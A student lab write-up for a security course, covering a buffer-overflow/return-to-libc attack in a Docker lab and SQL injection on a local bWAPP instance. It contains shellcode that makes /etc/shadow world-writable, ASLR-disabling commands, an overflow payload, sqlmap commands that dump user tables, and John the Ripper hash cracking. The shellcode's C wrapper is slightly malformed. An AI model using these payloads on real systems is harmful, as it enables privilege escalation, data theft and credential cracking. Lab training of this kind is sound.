# Lab #1,22110007, Nguyen Nhat An, INSE330380E_01FIE
# Task 1: Software buffer overflow attack
 
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode in C. This shellcode executes chmod 777 /etc/shadow without having to sudo to escalate privilege
```
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
"\x3a\x56\x81\xc6\x23\x45\x35\x21"
"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
"\x2f\x65\x74\x63\x83\xec\x0c\x89"
"\xe3\x66\x68\xff\x01\x66\x59\xb0"
"\x0f\xcd\x80";

int
void main() {
    int (*ret)() = (int(*)())code;
}
```
**Question 1**:
- Compile both C programs and shellcode to executable code. 
- Conduct the attack so that when C executable code runs, shellcode willc also be triggered. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:
## 1. Run docker machine and map folder into docker
```
docker run -it --privileged -v "C:/Users/Win 10/Seclabs:/home/seed/seclabs" img4lab
```
![image](https://github.com/user-attachments/assets/4b5050d4-fe2c-4cc8-874d-8ecd00e8d368)
## 2. Compile vuln.c and shellcode.c
* Compile vuln.c
  ```
  gcc -g vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
  ```
* Compile shellcode.c
  ```
  gcc -g shellcode.c -o shellcode -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
  ```
  ![image](https://github.com/user-attachments/assets/6c529c5c-4f6f-4b2a-a518-6ddcbd9646bd)
  
## 3. Turn off randomly given stack value and change to use an older bash
* Use below code to turn off randomly given stack value
  ```
  sudo sysctl -w kernel.randomize_va_space=0
  ```
* Use below code to enable to use old bash
  ```
  sudo ln -sf /bin/zsh /bin/sh
  ```
  ![image](https://github.com/user-attachments/assets/76beeb90-0bca-4070-ba4a-668826a3617f)
## 4. Create the environment variable
* Find the path
  ```
  pwd
  ```
  ![image](https://github.com/user-attachments/assets/3e1580bf-5ec9-4d3a-ad35-8dffa58de86f)


  `/home/seed/seclabs/testlab`
* Create variable
  ```
  export my_path="/home/seed/seclabs/testlab/shellcode"
  ```
  ![image](https://github.com/user-attachments/assets/6a13a5fd-9a2f-450a-b945-e439b37c79b0)

* Check to make sure this var is created
  ```
  echo $my_path
  ```
  ![image](https://github.com/user-attachments/assets/eb5afa8b-f88a-4f9f-b531-6dcdb18f7b3d)
## 5. Stackframe 
![image](https://github.com/user-attachments/assets/51131297-f0e9-4b67-bd8a-103864c43f1a)

Goal: we need to insert 16 + 4 bytes to overflow the return address. And when we reach the return address, we will insert the system address into the return address + insert 4 bytes of exit() address into Argc + insert 4 bytes of my_path variable into agrv

## 6. Check the privilege status of /etc/shadow before compiling the code
* Use the code below to see
  ```
  ls -l /etc/shadow
  ```
  ![image](https://github.com/user-attachments/assets/0fee35bb-5db5-486e-8b95-d965523e1d1e)
## 7. Find address to do the attack
* We will use gdb peda to find the address and to enter gdb use
  ```
  gdb -q vuln.out
  ```
* Start the program
  ```
  start
  ```
* Then find the address of `system()`, `exit()` and the my_path variable
  ```
  p system
  ```
  ```
  p exit
  ```
  ```
  find /home/seed/seclabs/testlab/shellcode
  ```
  ![image](https://github.com/user-attachments/assets/16d3af32-ac3a-407c-9689-b3eeb71507ff)

  The address of system is `0xf7e50db0` => `\xb0\x0d\xe5\xf7`

  The address of exit is `0xf7e449e0` => `\xe0\x49\xe4\xf7`

  The address of my_path is `0xffffdf46` => `\x46\xdf\xff\xff`
## 8. Conduct the attack
* From them and the stackframe, we have this code:
  ```
  r $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x46\xdf\xff\xff')")
  ```

**Conclusion**: It can use buffer-overflow and return to libc to conduct the attack
# Task 2: Attack on the database of bWapp 
- Install bWapp (refer to quang-ute/Security-labs/Web-security).
  * Set up and go directly to `localhost:8025/install.php`
  * Login to account with: username: `bee`, password: `bug`
  * Set the security level at `low`
 
    
    ![image](https://github.com/user-attachments/assets/f9eb428c-3109-4067-9bbc-423eaf5b68c6)


- Install sqlmap.
  * install by code below
    ```
    git clone https://github.com/sqlmapproject/sqlmap.git
    ```
    ![image](https://github.com/user-attachments/assets/9a127556-d2a6-4561-a9bc-0d508009841f)

    I have already installed.

- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:

* Change direct to SQL Injection (GET/Select)
  ![image](https://github.com/user-attachments/assets/ba69dd0f-9fee-4a9e-8922-0569f98cc591)


* We need cookies for the attack, so we will get them
  ![image](https://github.com/user-attachments/assets/fa59e0d2-df6b-4718-87e5-22541d4d2d2f)

  Cookies: `3jksnj690ba8735oii5lilch06`

  
* Press button submit:
  ![image](https://github.com/user-attachments/assets/8be81e2b-c7f2-47eb-8083-6a8d1ab81638)


* Store the url: `http://localhost:8025/sqli_2.php?movie=1&action=go`

* Use code for attack:
  ```
  python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" --cookie="PHPSESSID=3jksnj690ba8735oii5lilch06; security_level=0" --dbs
  ```
* After running, it shows the database
  ![image](https://github.com/user-attachments/assets/25002be4-923b-411e-802c-af3517454406)

**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:
* Use this code to see tables
  ```
  python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" --cookie="PHPSESSID=3jksnj690ba8735oii5lilch06; security_level=0" -D bWAPP --tables
  ```
  ![image](https://github.com/user-attachments/assets/808aabaa-d61c-401b-ac19-d7a5e1720f4b)

* Use this code to see users information
  ```
  python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" --cookie="PHPSESSID=3jksnj690ba8735oii5lilch06; security_level=0" -D bWAPP -T users --dump
  ```
  ![image](https://github.com/user-attachments/assets/098eb716-dce9-41e5-972f-ba38e8f7cff5)

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:


Use john the ripper to crack, i stored the password in file name hashes.txt copied from 


![image](https://github.com/user-attachments/assets/4d9aa8f8-ca44-40f6-9c69-000d167bfdf5)



![image](https://github.com/user-attachments/assets/70325ec1-8017-4a30-8526-a5a461a0f375)



after excecuting it


![image](https://github.com/user-attachments/assets/a770a87a-6a76-4f81-9fbd-998878e76972)

**Conclusion**: In this lab, we explored SQL injection vulnerabilities on the bWAPP application and used sqlmap to exploit them. We successfully extracted databases, tables, and user information. Then, we utilized John the Ripper to crack the hashed passwords of the users. This highlights the importance of securing web applications against common attacks such as SQL injections and strengthening password storage methods.
